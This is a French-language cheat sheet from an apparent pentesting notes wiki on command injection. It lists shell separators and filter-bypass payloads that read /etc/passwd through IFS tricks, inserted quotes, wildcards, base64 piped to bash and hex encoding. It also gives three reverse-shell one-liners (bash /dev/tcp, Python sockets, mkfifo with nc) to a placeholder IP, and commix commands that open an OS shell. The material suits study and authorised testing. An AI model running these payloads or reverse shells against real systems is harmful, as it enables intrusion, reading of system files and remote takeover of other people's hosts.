---
titre: "Command Injection — 3 - Payloads & bypass"
tags: [Failles, command-injection, payloads, bypass, cheatsheet]
---

# Command Injection — 3. Payloads & bypass

> ⬅ [[Command Injection - Index]]

## Séparateurs & substitution
```
;   |   ||   &&   &   %0a (\n)   %0d (\r)
`cmd`     $(cmd)     ${cmd}
```

## Bypass des espaces filtrés
```
cat${IFS}/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS$9/etc/passwd
X=$'\x20'; cat${X}/etc/passwd
```

## Bypass de blacklist de mots-clés
```
# concaténation / quotes insérées (le shell les ignore)
c""at /etc/passwd     c''at /etc/passwd     ca\t /etc/passwd
# variables
a=c;b=at;$a$b /etc/passwd
# wildcards
/bin/c?t /etc/passwd     /???/cat /etc/passwd
/bin/cat /etc/pa*wd
# encodage puis exécution
echo cat /etc/passwd | base64   → echo <b64> | base64 -d | bash
$(printf '\x63\x61\x74') /etc/passwd
# ordre inversé
echo dwssap/cte/ tac | rev | ... (rev)
```

## Contourner la détection de `/`
```
${HOME:0:1}          → "/"     (puis ${HOME:0:1}etc${HOME:0:1}passwd)
$(echo . | tr '.' '/')
```

## Reverse shells (rappel)
```bash
bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f
```
Générateur complet : [[HackTricks & revshells]].

## Outils
```bash
# détection/exploitation automatisée
commix -u "http://CIBLE/ping?host=127.0.0.1" --level 3     # cf. [[commix]]
commix -u "http://CIBLE/ping" --data="host=127.0.0.1" --os-shell
```
> Détection : [[1 - Repérage (Command Injection)]] · techniques : [[2 - Exploitation & techniques (Command Injection)]].
